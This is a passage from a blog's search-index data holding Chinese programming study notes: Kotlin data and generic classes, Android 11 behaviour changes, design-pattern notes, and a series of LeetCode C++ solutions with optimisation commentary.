&quot;outer name&quot;) { inner class innerClass(var inrName:String = &quot;inner name&quot;) { fun getInfo():String { return &quot;内部类的名字是：${inrName}\\n外部类的名字是：${otrName}&quot; } }} 枚举类和密封类先不学 数据类在类名前加上data修饰 特点 这种类自动生成每个字段的get和set方法 equals方法，比较每一个数据 提供copy方法，用于复制数据对象 提供toSting方法 注意 必须有主构造函数，且至少一个参数 输入参数前面必须要加val或var 数据类不能是基类，不能是子类，不能是抽象类，不能是内部类，不能是密封类 模板类类名后面添加&lt;/*泛型列表*/&gt;，表示这是一个模板类 例子123class MyArray&lt;T&gt; (var arr:Array&lt;T&gt;) { }","link":"/home/2019/04/12/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Kotlin%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%AF%87%E4%B9%8B%E7%B1%BB%E5%92%8C%E5%AF%B9%E8%B1%A1/"},{"title":"实习笔记-24","text":"设备到设备文件传输如果您的应用以 Android 11 或更高版本为目标平台，您将无法使用 allowBackup 属性停用应用文件的设备到设备迁移。系统会自动启用此功能。 不过，即使您的应用以 Android 11 或更高版本为目标平台，您也可以通过将 allowBackup 属性设为 false 来停用应用文件的云端备份和恢复。 非 SDK 接口限制相机媒体 intent 操作需要系统默认相机从 Android 11 开始，只有预装的系统相机应用可以响应以下 intent 操作： android.media.action.VIDEO_CAPTUREandroid.media.action.IMAGE_CAPTUREandroid.media.action.IMAGE_CAPTURE_SECURE如果有多个预装的系统相机应用可用，系统会显示一个对话框，供用户选择应用。如果您希望自己的应用使用特定的第三方相机应用来代表其捕获图片或视频，可以通过为 intent 设置软件包名称或组件来使这些 intent 变得明确。 应用打包和安装现在还必须使用 APK 签名方案 v2 或更高版本进行签名 Toastopen fun setView(view: View!): Unit Deprecated: Custom toast views are deprecated. Apps can create a standard text toast with the Custom toast views are deprecated. 以 Android 11 或更高版本为目标平台的应用会发现文本消息框受到以下负面影响： getView() 方法返回 null。 以下方法的返回值并不反映实际值，因此您不应在应用中依赖于它们： getHorizontalMargin() getVerticalMargin() getGravity() getXOffset() getYOffset() 以下方法是空操作，因此您的应用不应使用它们： setMargin() setGravity()","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AE%89%E5%8D%9311%E6%96%B0%E7%89%B9%E6%80%A7/"},{"title":"实习笔记-25","text":"创建型单例优点 节省资源 内存 重对象中包含的io，文件指针 调用方便 缺点 适用于昂贵对象，对于轻量对象，为了维护单例造成的同步等开销比创建一个对象更高。得不偿失 不方便mock，（可以把单例对象作为函数参数则可以mock），相较于静态方法更方便（静态方法需要代理的方式mock） 测试时常常并行测试，使用单例会降低效率函数式编程，拷贝云控，打点 Alex静态工具方法，少用，不要有状态，确保永远不会变 建造者 构建一个参数非常复杂的对象，但是常用的组合很有限，写一个builder提供常用组合，builder内部自己填充其他的参数 与连续调用没有关系，可以链式调用的叫fluentApi 优点 完整性 创建对象的合法性，在build时检查/默认值 灵活性 工厂静态工厂线程池，collections封装构造器，简化构造 实例工厂解耦时，不希望类持有不需要的类，使用factory持有该对象 抽象工厂返回抽象/接口，方便修改，选择不同实现 结构型添加新需求，加判断，时尝试： 代理模式（构造器传入委托人） wrapper 快捷键，double shift， 搜 delegate method 静态代理（正常）动态代理（反射）装饰器（相互组合代理） wrapper 内部看为代理-委托 给执行包一层皮，每层皮实现一种功能（如对cloud加缓存、sdk模式），包的顺序不同，调用顺序也不同 组合模式（对象持有） wrapper eg 对方法计数，如果是继承（推荐默认final， kotlin默认final），子类的行为改变了父类的行为（父类调用自己计过数的方法），组合模式避免了这种情况 局限性，内部的特性无法访问 组合由于继承","link":"/home/2022/03/22/Kotlin-Android%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"title":"LeetCode-1","text":"1.两数之和AC代码思路 刚开始就是用双层for循环写，然后秉承着谦虚的态度看了题解，发现真的有O(N)的算法一遍哈希表。 主要就是利用map建立从数到数组下标的map，然后每次计算出target-nums[i]的值，然后看map里面有对应的下标，有的话就输出，没有就继续。 map的值为0时，如何区分stl的map知识有限，如何判断0是数组里面没有这个数还是查询的引索为0呢？只要储存的时候下标+1，用的时候减一就行了，这样map值为0，一定是没有这个数。 12345678910111213141516171819class Solution {public: vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; nums, int target) { vector&lt;int&gt; ans; map&lt;int, int&gt; m; for (int i = 0; i &lt; nums.size(); i++) { int pos = target - nums[i]; if (m[pos] != 0 &amp;&amp; m[pos] != i + 1) { pos = m[pos] - 1; ans.push_back(pos &gt; i ? i : pos); ans.push_back(pos &lt; i ? i : pos); break; } m[nums[i]] = i + 1; } return ans; }}; 2. 两数相加没想到第二题就是链表了，LeetCode给出的这种带构造函数的结构体挺好的，用起来方便了很多，开始创建一个head，后面直接返回head-&gt;next就好。 next自动赋值为NULL（我觉得可以搞成next默认参数为NULL，自由度更大一点） 必须传递参数，限制使用，更安全 AC代码12345678910111213141516171819202122232425262728293031323334353637/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* addTwoNumbers(ListNode* l1, ListNode* l2) { ListNode* temp, *ans; int carry = 0, n; ans = temp = new ListNode(0); while (l1 != NULL || l2 != NULL) { //用逻辑或链接，把两个链表都遍历完 n = (l1 == NULL ? 0 : l1-&gt;val) + (l2 == NULL ? 0 : l2-&gt;val) + carry; //注意某个链表此时可能遍历完的可能 temp-&gt;next = new ListNode(n%10); carry = n / 10; //计算 if (l1 != NULL)l1 = l1-&gt;next; if (l2 != NULL)l2 = l2-&gt;next; //注意到链表为空或已经遍历完 temp = temp-&gt;next; //集体指向next } if (carry) temp-&gt;next = new ListNode(carry); //如果还有剩余的进位，再new一个 return ans-&gt;next; //返回头结点的next（头结点没意义） }}; 7. 整数反转第一次AC的，28ms思路 先干掉负号，sprintf变字符串，调用std的reverse函数，反转，再变回数字，然后把符号还原 由于要考察对溢出的处理，就偷梁换柱用了long long，超过int范围的就返回0 1234567891011121314class Solution {public: int reverse(int y) { long long x = y; bool negative = (x &lt; 0); if (negative) x *= -1; char n[1024]; sprintf(n, &quot;%lld&quot;, x); std::reverse(n, n + strlen(n)); sscanf (n, &quot;%lld&quot;, &amp;x); if (negative) x *= -1; return x &gt;= 2147483647 || x &lt;= -2147483648 ? 0 : x; }}; 看了的高分同学的代码第二次AC的20ms手动大哭，凭什么一样的算法，人家就是最高分，我就是中位数？？这位同学代码块的原因主要是解除了与stdio的同步，cin.tie(nullptr)对cin，cout进行加速了，把取消同步的代码删除后，反而比我第一次AC的代码慢了。也不知道是什么原因。 1234567891011121314static int x = [](){ios::sync_with_stdio(false); cin.tie(nullptr); return 0; }();class Solution {public: int reverse(int y) { long long x = y; long long ans = 0; while (x) { ans *= 10; ans += x % 10; x /= 10; } return ans &gt;= 2147483647 || ans &lt;= -2147483648 ? 0 : ans; }}; 9. 回文数第一次AC代码思路转字符串，直接循环比 1234567891011121314class Solution {public: bool isPalindrome(int x) { char n[16] = {0}; sprintf(n, &quot;%d&quot;, x); int len = strlen(n); for (int i = 0; i &lt; len/2; i++) { if (n[i] != n[len - 1 - i]) { return false; } } return true; }}; 看了高分同学代码后的第二次AC的代码思路把数字当十进制转十进制，算一次的结果刚好和原来的数反转过来，如果大于0，比较两个数是否相等，否则反转一定不合条件，返回false 12345678910class Solution {public: bool isPalindrome(int x) { long long y = 0; for (int z = x; z; z /= 10) { y = y*10 + z % 10; } return x &gt;= 0 ? y == x : false; }}; 13. 罗马数字转整数刚开始毫无思路，后来看了评论里大佬的思路才写出来。 第一次AC代码思路 把几个符号的ASCII值当下标，储存符号的对应的值 遍历字符串，对于每一个字符，如果后一个字符的值大于自身，从总数中减去自己的值，如果后面的值小于等于自身（III，MMII），则在总数中加上自己 123456789101112131415161718192021222324252627static const auto io_sync_off=[](){ std::ios::sync_with_stdio(false); std::cin.tie(NULL); return 0;}();class Solution {public: int romanToInt(string s) { int m[100] = {0}; m['M'] = 1000; m['D'] = 500; m['C'] = 100; m['L'] = 50; m['X'] = 10; m['V'] = 5; m['I'] = 1; int ans = 0; for (int i = 0; i &lt; s.length() - 1; i++) { //防止越界，不管最后一个字符，循环结束后单独考虑 if (m[s[i]] &gt;= m[s[i+1]]) ans += m[s[i]]; else ans -= m[s[i]]; } ans += m[s[s.length() - 1]]; //最后一个字符没有后面一个，不论如何，都加上它的值 return ans; }}; 14. 最长公共前缀第一次AC代码思路 找到最短的字符串 从1开始截取字符串，跟其他字符串的前缀比较，直到出现前缀不同 1234567891011121314151617181920212223242526272829303132static const auto __ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); return nullptr;}();class Solution {public: string longestCommonPrefix(vector&lt;string&gt;&amp; strs) { string ans; for (int i = 0; i &lt; minlen(strs); i++) { bool find = false; char cmp = strs[0][i]; for (int j = 0; j &lt; strs.size(); j++) { if (cmp != strs[j][i]) { find = true; break; } } if (!find) ans.append(1, cmp); else break; } return ans; } int minlen(vector&lt;string&gt;&amp; strs) { if (strs.size() == 0) return 0; int min = strs[0].length(); for (int i = 1; i &lt; strs.size(); i++) { if (strs[i].length() &lt; min) min = strs[i].length(); } return min; }}; 看了题解后利用二分查找法的AC代码（Edition 1）思路 找到最短的字符串的下标 把最短的字符串一分为二，自己变成前半段，后半段存在另一个string里面 比较一次，如果前缀都相同，把右半边一分为二，拼接到左半半，右半半变成自己的右半半。 一次比较完成后 如果前缀都相同，且后半半只剩一个字符了，把这个字符拼过去再查一次，有问题就恢复，没问题保留，返回此时的左半半；如果前缀 如果前缀不同，左半半只剩下一个字符了，在比较一次，看看这个字符是不是公共前缀，是就返回，否则返回空串（没有公共前缀） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566static const auto __ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); return nullptr;}();class Solution {public: string longestCommonPrefix(vector&lt;string&gt;&amp; strs) { if (strs.size() == 1) return strs[0]; if (!strs.size()) return &quot;&quot;; int min = IndexOfMinLen(strs); if (!strs[min].length()) return &quot;&quot;; string sub = strs[min].substr(0, strs[min].length() / 2); string right = strs[min].substr(strs[min].length() / 2, strs[min].length() - strs[min].length() / 2); while (1){ bool find = false; for (int i = 0; i &lt; strs.size(); i++) { if (strs[i].substr(0, sub.length()) != sub) { find = true; } } if (find) { if (sub.length() == 1) { for (int i = 0; i &lt; strs.size(); i++) { if (strs[i].substr(0, sub.length()) != sub) { find = true; } } if (find) { sub = &quot;&quot;; } break; } right = sub.substr(sub.length() / 2, sub.length() - sub.length()/2); sub = sub.substr(0, sub.length()/2); } else { if (right.length() == 1) { for (int i = 0; i &lt; strs.size(); i++) { if (strs[i].substr(0, sub.length()+1) != sub + right) { find = true; } } if (!find) { sub += right; } break; } sub.append(right.substr(0, right.length()/2)); right = right.substr(right.length() / 2, right.length() - right.length()/2); } } return sub; } int IndexOfMinLen(vector&lt;string&gt;&amp; strs) { int min = strs[0].length(); int pos = 0; for (int i = 1; i &lt; strs.size(); i++) { if (strs[i].length() &lt; min) { min = strs[i].length(); pos = i; } } return pos; }}; 根据题解写的简化版二分查找（Edition 2）思路 每次截取一半，遍历比较 如果前缀相同，把边界右移一半 如果前缀不同，把边界前移一半 123456789101112131415161718192021222324252627282930313233343536373839404142434445static const auto __ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); return nullptr;}();class Solution {public: string longestCommonPrefix(vector&lt;string&gt;&amp; strs) { if (strs.size() == 1) return strs[0]; if (!strs.size()) return &quot;&quot;; int min = IndexOfMinLen(strs); if (!strs[min].length()) return &quot;&quot;; int len = strs[min].length(); int left = 1, right = strs[min].length(); string sub; while (left &lt;= right){ int mid = (left + right) / 2; sub = strs[min].substr(0, mid); bool find = false; for (int i = 0; i &lt; strs.size(); i++) { if (strs[i].substr(0, sub.length()) != sub) { find = true; } } if (find) { right = mid - 1; } else { left = mid + 1; } } sub = strs[min].substr(0, (left + right) / 2); return sub; } int IndexOfMinLen(vector&lt;string&gt;&amp; strs) { int min = strs[0].length(); int pos = 0; for (int i = 1; i &lt; strs.size(); i++) { if (strs[i].length() &lt; min) { min = strs[i].length(); pos = i; } } return pos; }};","link":"/home/2019/02/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%931/"},{"title":"LeetCode-10","text":"2020-07-25Z 字形变换AC代码123456789101112131415161718192021222324252627282930class Solution {public: string convert(string s, int numRows) { if (numRows &lt;= 1) { return s; } int n = s.size(); string temp[numRows]; int t_numRows = 0; int p = 0; while(p &lt; n) { while(p &lt; n &amp;&amp; t_numRows &lt; numRows) { temp[t_numRows] += s[p]; p++; t_numRows++; } t_numRows = numRows -2; while (p &lt; n &amp;&amp; t_numRows &gt; 0) { temp[t_numRows] += s[p]; p++; t_numRows--; } } string res; for(int i = 0 ; i &lt; numRows; i++) { res = res + temp[i]; } return res; }}; 优化思路 两层while循环多次判断p&lt;n,效率底下，实际上只需要当t_numRows==0或t_numRows==numRows-1时改变方向即可 实际上需要的string数组长度是min(n, numRows) 优化代码1234567891011121314151617181920212223class Solution {public: string convert(string s, int numRows) { if (numRows &lt;= 1) { return s; } int n = int(s.size()); int len = min(numRows, n); vector&lt;string&gt; temp(len); int t_numRows = 0; bool goingDown = false; for(int i = 0; i &lt; n; i++) { temp[t_numRows] += s[i]; if (t_numRows == 0 || t_numRows == numRows-1) { goingDown = !goingDown; } t_numRows += goingDown ? 1 :-1; } string res; for (int i = 0; i &lt; len; i++) res += temp[i]; return res; }}; 再次优化可以直接找新旧数列的数字关系，直接计算 优化代码123456789101112131415161718192021222324252627282930313233class Solution {public: string convert(string s, int numRows) { if (numRows &lt;= 1) { return s; } int len_s = int(s.size()); int unit =(2*numRows-2); int n = len_s/unit; int remain = len_s%unit; string res(len_s, 0); for (int i = 0; i &lt; len_s; i++) { int p = 0; if (i%unit == 0) { p = i/unit+1; } else { int r = i%unit + 1,c = i/unit+1; if (r &gt; numRows) { r = unit-r+2; p = 1; } else if (r == numRows) { p = 1-c; } p += n + (n*2)*(r-2) + 2*(c-1) + min(r-1, remain)+1; if (remain &gt; numRows) { p += max(r-(unit-remain+2),0); } } res[p-1] = s[i]; } return res; }}; 最终成绩 执行用时：8 ms, 在所有 C++ 提交中击败了98.89%的用户 内存消耗：7.7 MB, 在所有 C++ 提交中击败了100.00%的用户 ### 75. 颜色分类AC代码 计数12345678910111213141516class Solution {public: void sortColors(vector&lt;int&gt;&amp; nums) { int n[3] = {0}; for(int i : nums) { n[i]++; } int x = 0; for (int i = 0; i &lt; 3; i++) { for (int j = 0; j &lt; n[i]; j++) { nums[j+x] = i; } x += n[i]; } }}; 优化 三指针法123456789101112131415161718192021class Solution {public: void sortColors(vector&lt;int&gt;&amp; nums) { int f,t = int(nums.size())-1,m; f = m = 0; while (m &lt;= t) { if (nums[m] == 0) { swap(nums[m++], nums[f++]); } else if (nums[m] == 2) { swap(nums[m], nums[t--]); } else { m++; } } } void xchg(int&amp; a, int&amp; b) { a = a+b; b = a-b; a = a-b; }}; 129. 求根到叶子节点数字之和AC代码1234567891011121314151617181920212223class Solution {public: int sum = 0; void go(TreeNode* root, int num) { if (root-&gt;left == NULL &amp;&amp; root-&gt;right == NULL) { sum += num*10+root-&gt;val; return; } if (root-&gt;left != NULL) { go(root-&gt;left, num*10+root-&gt;val); } if (root-&gt;right != NULL) { go(root-&gt;right, num*10+root-&gt;val); } } int sumNumbers(TreeNode* root) { if (root == NULL) { return 0; } go(root, 0); return sum; }}; 29. 两数相除AC代码12345678910111213141516171819202122232425262728class Solution {public: unsigned int i2ui(int n) { return (n&lt;0&amp;&amp;n != -2147483648)?-n:((n == -2147483648) ? 2147483648 : n); } int divide(int dividend, int divisor) { bool neg = (dividend&lt;0)^(divisor&lt;0); unsigned int a = i2ui(dividend), b = i2ui(divisor); unsigned int res = 0; unsigned int tb = b; unsigned int add = 1; while((tb &amp; 0x80000000)==0) { tb &lt;&lt;= 1; add &lt;&lt;= 1; } while (a &gt;= b) { if (a &gt;= tb) { res += add; a -= tb; } add &gt;&gt;=1; tb &gt;&gt;= 1; } res = (res &gt; 2147483647 &amp;&amp; !neg) ? INT_MAX : res; int ires = neg ? ((res&gt;2147483648)?INT_MAX:-res) : res; return ires; }}; 思路利用最基本的列竖式法，先转成正数，再计算 优化 不满足题目的假设我们的环境只能存储 32 位有符号整数的条件 类似上面的算法，把所有数转化为负数，再对divisor=0x80000000时特判 优化代码123456789101112131415161718192021222324252627282930313233343536373839class Solution {public: int nabs(int n) { return (n &gt; 0)? -n : n; } int divide(int dividend, int divisor) { int neg = ((dividend&lt;0)^(divisor&lt;0)); dividend = nabs(dividend); divisor = nabs(divisor); int sub = 1; if (divisor==INT_MIN) { return (dividend == INT_MIN) ? 1 : 0; } int t_divisor = -divisor; while((t_divisor &amp; 0x40000000)==0) { t_divisor &lt;&lt;= 1; sub &lt;&lt;= 1; } int res = 0;// cout &lt;&lt; t_divisor &lt;&lt; &quot; &quot; &lt;&lt; sub &lt;&lt; endl; while (dividend &lt;= divisor &amp;&amp; sub != 0) { if (dividend &lt;= -t_divisor) { dividend += t_divisor; res -= sub; } sub &gt;&gt;= 1; t_divisor &gt;&gt;= 1; } if (dividend &lt;= divisor) { res = (res == INT_MIN)? res : res-1;// cout &lt;&lt; res &lt;&lt; endl; } res = !neg ? ((res==-2147483648)?INT_MAX:-res) : res; return res; }}; 最终成绩 执行用时：0 ms, 在所有 C++ 提交中击败了100.00%的用户 内存消耗：6 MB, 在所有 C++ 提交中击败了100.00%的用户 36. 有效的数独AC代码12345678910111213141516171819202122232425262728293031323334class Solution {public: bool isValidSudoku(vector&lt;vector&lt;char&gt;&gt;&amp; board) { for (int i = 0; i &lt; 9; i++) { int r[9] = {0}; int c[9] = {0}; int s[9] = {0}; for (int j = 0; j &lt; 9; j++) { if (board[i][j] != '.') { r[board[i][j]-'1']++; } if (board[j][i] != '.') { c[board[j][i]-'1']++; } } int a = i/3; int b = i%3; for (int ii = 3*a; ii &lt; 3*(a+1); ii++) { for (int ij = 3*b; ij &lt; 3*(b+1); ij++) { if (board[ii][ij] != '.') { s[board[ii][ij]-'1']++; } } } for (int j = 0; j &lt; 9; j++) { if (r[j] &gt; 1 || c[j] &gt; 1 || s[j] &gt; 1) { return false; } } } return true; }}; 5. 最长回文子串AC代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class Solution {public: map&lt;int ,int, greater&lt;int&gt;&gt; m; int rb=0,re=0; string longestPalindrome(string s) { int n = int(s.size()); if (n &lt;= 0) { return &quot;&quot;; } go(s, 0, n); for (int off = 1; off &lt; n; off++) { go(s, off, n); go(s, 0, n-off); } while (!m.empty()) { int sub = m.begin()-&gt;first; int sum = m.begin()-&gt;second; int beg = (sum-sub)/2; int end = (sum+sub)/2; if(go(s, beg,end) &amp;&amp; ((re-rb) &gt; (end-beg))) break; } return s.substr(rb, re-rb); } bool go(string&amp; s,int beg, int end) { int pos = isPalindrome(s, beg, end); if (pos != beg) { end -= pos-beg; beg = pos; m[end-beg]=end+beg; return false; }else { m.erase(end-beg); if ((end-beg) &gt; (re-rb)) { rb = beg; re = end; } return true; } } int isPalindrome(string&amp; s, int beg, int end) { int res = -1; for(int i = 0; i &lt; (end-beg)/2; i++) { if(s[beg+i] != s[end-1 - i] &amp;&amp; i &gt; res) res = i; } return beg+res+1; }}; 优化参考优秀的题解，大致思想是把每个字符作为中心，向左右展开 123456789101112131415161718192021222324252627282930class Solution {public: int l=0,h=0; string longestPalindrome(string s) { int n = int(s.size()); if (n &lt;= 1) { return s; } for (int i = 0; i &lt; n; i++) { i = findLongest(s, i, n); } return s.substr(l, h-l+1); } int findLongest(const string&amp; s,int i, int n) { int high = i; while (high &lt; n-1 &amp;&amp; s[high+1] == s[i]) { high++; }// 中部字符全部相同 int ans = high; while (i &gt; 0 &amp;&amp; high &lt; n-1 &amp;&amp; s[i-1]==s[high+1]) { i--; high++;//向两边展开 } if ((high - i) &gt; h-l) { h = high; l = i; //更新最长串的位置 } return ans; }}; 62. 不同路径思路大佬们都是用dp，而我是推公式，就是这么简单 AC代码12345678910111213141516171819202122232425262728class Solution {public: int uniquePaths(int m, int n) { if (m &gt; n) { m = m+n; n = m-n; m = m-n; } int res = n; if (m &lt; 2) { return 1; } if (m == 2) { return n; } vector&lt;int&gt; v(m-2, 0); for (int i = 1; i &lt;= n-1; i++) { v[0] += i; for (int j = 1; j &lt; m - 2; j++) { v[j] += v[j-1]; } } for (int i = 0; i &lt; m -2; i++) { res += v[i]; } return res; }}; 最终成绩 执行用时：0 ms, 在所有 C++ 提交中击败了100.00%的用户 内存消耗：5.9MB, 在所有 C++ 提交中击败了100.00%的用户 63. 不同路径 IIAC代码123456789101112131415161718192021222324252627282930313233class Solution {public: int uniquePathsWithObstacles(vector&lt;vector&lt;int&gt;&gt;&amp; obstacleGrid) { int n = int(obstacleGrid.size()); int m = int(obstacleGrid[0].size()); bool swap = false; if (m &gt; n) { m = m+n; n = m-n; m = m-n; swap = true; } vector&lt;long long&gt; v(m+1, 0); long long t_v0 = 1; for (int i = 0; i &lt; n; i++) { if ((!swap &amp;&amp; obstacleGrid[n-i-1][m-1]) || (swap &amp;&amp; obstacleGrid[m-1][n-1-i])) { v[0] = 0; } else { v[0] = t_v0; } t_v0 = v[0]; for(int j = 1; j &lt; m; j++) { if ((!swap &amp;&amp; obstacleGrid[n-i-1][m-1-j]) || (swap &amp;&amp; obstacleGrid[m-1-j][n-1-i])) { v[j] = 0; } else { v[j] += v[j-1]; } } } return (int)v[m-1]; }}; 优化1不需要转置，这个问题来自于试错过程中的错误判断看了题解以后发现自己的代码和它惊人的相似，原来我无师自通学会动规了？？哈哈哈哈 优化1代码12345678910111213141516171819202122232425class Solution {public: int uniquePathsWithObstacles(vector&lt;vector&lt;int&gt;&gt;&amp; obstacleGrid) { int n = int(obstacleGrid.size()); int m = int(obstacleGrid[0].size()); vector&lt;long long&gt; v(m+1, 0); long long t_v0 = 1; for (int i = 0; i &lt; n; i++) { if (obstacleGrid[n-i-1][m-1]) { v[0] = 0; } else { v[0] = t_v0; } t_v0 = v[0]; for(int j = 1; j &lt; m; j++) { if (obstacleGrid[n-i-1][m-1-j]) { v[j] = 0; } else { v[j] += v[j-1]; } } } return (int)v[m-1]; }};","link":"/home/2020/07/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9310/"},{"title":"LeetCode-11","text":"2020-07-2755. 跳跃游戏思路 对nums数组，令nums[i] += i,这样表示i位置最远可以走到的距离 算法 从i = 0开始对于当前i，可以从0走到nums[i]，选取0-nums[i]的最大值，如果最大值大于等于n-1，则可以到达最后，若小于，重复这个步骤，除非i=最大值，则不能到达最后 为了降低时间复杂度，创建一个数组v，v[i] = max(nums[k]), k = 0,1,…,i AC代码12345678910111213141516171819202122232425class Solution {public: bool canJump(vector&lt;int&gt;&amp; nums) { int n = int(nums.size()); for(int i = 0; i &lt; n; i++) { nums[i] += i; } vector&lt;int&gt; v; int max = nums[0]; for(int i = 0; i &lt; n; i++) { if (nums[i] &gt; max) { max = nums[i]; } v.push_back(max); } int i = 0; while (i != v[i]) { i = v[i]; if (i &gt;= n-1) { return true; } } return false || n == 1; }}; 优化参考已经提交的代码，可以不创建数组v，也用O(n)的时间完成 优化代码123456789101112131415161718class Solution {public: bool canJump(vector&lt;int&gt;&amp; nums) { int n = int(nums.size()); int i = 0; int max = nums[0]; while (i &lt;= max) { if (max &lt; i + nums[i]) { max = i + nums[i]; } if (max &gt;= n-1) { return true; } i++; } return false || n == 1; }}; 这道题leetcode上的测速不准，没有参考价值，相同参考代码能跑出不同的速度。 16. 最接近的三数之和AC代码123456789101112131415161718class Solution {public: int threeSumClosest(vector&lt;int&gt;&amp; nums, int target) { sort(nums.begin(), nums.end()); int mincut = nums[0] + nums[1] + nums[2]; for(int i = 0; i &lt; (int)nums.size() - 2; i ++) { int j = i + 1, k = nums.size() - 1; while(j &lt; k) { int threesum = nums[i] + nums[j] + nums[k]; if(abs(threesum - target) &lt; abs(mincut - target)) mincut = threesum; if(threesum == target) return target; else if(threesum &lt; target) j ++; else k --; } } return mincut; }}; 优化跳过一些不用考虑的值，1.和上次枚举的数相同的值，2.已经等于target的情况 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950class Solution {public: int threeSumClosest(vector&lt;int&gt;&amp; nums, int target) { sort(nums.begin(), nums.end()); int n = nums.size(); int best = 1e7; // 根据差值的绝对值来更新答案 // 枚举 a for (int i = 0; i &lt; n; ++i) { // 保证和上一次枚举的元素不相等 if (i &gt; 0 &amp;&amp; nums[i] == nums[i - 1]) { continue; } // 使用双指针枚举 b 和 c int j = i + 1, k = n - 1; while (j &lt; k) { int sum = nums[i] + nums[j] + nums[k]; // 如果和为 target 直接返回答案 if (sum == target) { return target; } if (abs(sum - target) &lt; abs(best - target)) { best = sum; } if (sum &gt; target) { // 如果和大于 target，移动 c 对应的指针 int k0 = k - 1; // 移动到下一个不相等的元素 while (j &lt; k0 &amp;&amp; nums[k0] == nums[k]) { --k0; } k = k0; } else { // 如果和小于 target，移动 b 对应的指针 int j0 = j + 1; // 移动到下一个不相等的元素 while (j0 &lt; k &amp;&amp; nums[j0] == nums[j]) { ++j0; } j = j0; } } } return best; }}; 61. 旋转链表AC代码123456789101112131415161718192021222324class Solution {public: ListNode* rotateRight(ListNode* head, int k) { if(head == NULL) { return head; } int n = 0; ListNode *p = head; while (p-&gt;next != NULL) { n++; p = p-&gt;next; } n++; k %= n; p-&gt;next = head; p = head; for (int i = 0; i &lt; n - k - 1; i++) { p = p-&gt;next; } ListNode* new_head = p-&gt;next; p-&gt;next = NULL; return new_head; }}; 经验看似简单的题，发现了自己的知识漏洞，图遍历的时候要有visit数组记录它是否访问过，此处用map代替。 133. 克隆图AC代码123456789101112131415161718192021222324class Solution {public: Node* cloneGraph(Node* node) { if(node == NULL) return NULL; unordered_map&lt;Node*, Node*&gt; m; queue&lt;Node*&gt; q; q.push(node); Node* head = new Node(node-&gt;val, vector&lt;Node*&gt;{}); m[node]=head; while (!q.empty()) { Node* temp = q.front(); q.pop(); for (Node* child: temp-&gt;neighbors) { if(!m.count(child)) { m[child] = new Node(child-&gt;val, vector&lt;Node*&gt;{}); q.push(child); } m[temp]-&gt;neighbors.push_back(m[child]); } } return head; }}; 120. 三角形最小路径和超时算法 普通的搜索123456789101112131415161718192021222324252627282930class Solution {public: int minimumTotal(vector&lt;vector&lt;int&gt;&gt;&amp; triangle) { int ni = int(triangle.size()); vector&lt;int&gt; v(ni, 0); vector&lt;int&gt; index(ni, 0); int sum = INT_MAX; while(v[0] == 0) { int t_sum = 0; for (int j = 0; j &lt; ni; j++) { t_sum += triangle[j][index[j]]; } if (t_sum &lt; sum) { sum = t_sum; } int i = ni-1; while (i &gt; 0 &amp;&amp; v[i] == 1) { v[i] = 0; i--; } index[i]++; for (int j = i+1; j &lt; ni ; j++) { index[j] = index[j-1]; } v[i] = 1; } return sum; }}; 优化思路一个个枚举会超时，要用动态规划 AC代码12345678910111213141516class Solution {public: int minimumTotal(vector&lt;vector&lt;int&gt;&gt;&amp; triangle) { int ni = int(triangle.size()); vector&lt;int&gt; v(ni, 0); v[0] = triangle[0][0]; for (int i = 1; i &lt; ni; i++) { v[i] = v[i-1] + triangle[i][i]; for (int j = i - 1; j &gt; 0; j--) { v[j] = min(v[j-1],v[j]) + triangle[i][j]; } v[0] += triangle[i][0]; } return *min_element(v.begin(), v.end()); }}; 2020-07-2833. 搜索旋转排序数组AC代码12345678910111213141516171819202122232425262728293031class Solution {public: int search(vector&lt;int&gt;&amp; nums, int target) { int l = 0, h = int(nums.size())-1; while (l &lt;= h) { int mid = (h-l)/2+l; if (nums[mid] == target) { return mid; } if (nums[mid] &gt; nums[l]) { if (target &gt;= nums[l] &amp;&amp; target &lt; nums[mid]) { h = mid - 1; } else { l = mid + 1; } } else if (nums[mid] == nums[l]) { if (h == l) { return -1; } l++; } else { if (target &lt;= nums[h] &amp;&amp; target &gt; nums[mid]) { l = mid + 1; } else { h = mid - 1; } } } return -1; }}; 思路 二分查找法，由于是两段有序，分别有几种情况，且没有相等元素 nums[mid] &gt; nums[l]，说明l-mid为严格的升序，如果target在nums[l]-nums[mid]之间，h=mid-1，否则l=mid+1。切换到l-h之间搜索 nums[mid] == nums[l]，说明 (l+h)/2 = l, h=l-1 或 h=l h=l-1，令l=h h=l，mid=h=l，说明无解，return -1 nums[mid] &lt; nums[h]，说明mid-h为严格升序，如果target在nums[mid]-nums[h]之间，l=mid+1，否则h=mid-1。切换到l-h之间搜索 74. 搜索二维矩阵AC代码123456789101112131415161718192021222324class Solution {public: bool searchMatrix(vector&lt;vector&lt;int&gt;&gt;&amp; matrix, int target) { int m = int(matrix.size()); if (m &lt;= 0) { return false; } int n = int(matrix[0].size()); int num = m*n; int l = 0,h = num-1; while (l &lt;= h) {\\\\二分查找法 int mid = (h-l)/2+l; if (matrix[(mid)/n][(mid)%n] == target) {//算出mid对应的下标就行 return true; } else if (matrix[(mid)/n][(mid)%n] &gt; target) { h = mid-1; } else { l = mid+1; } } return false; }};","link":"/home/2020/07/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9311/"},{"title":"LeetCode-13","text":"1640. 能否连接形成数组123456789101112131415161718192021222324class Solution {public: bool canFormArray(vector&lt;int&gt;&amp; arr, 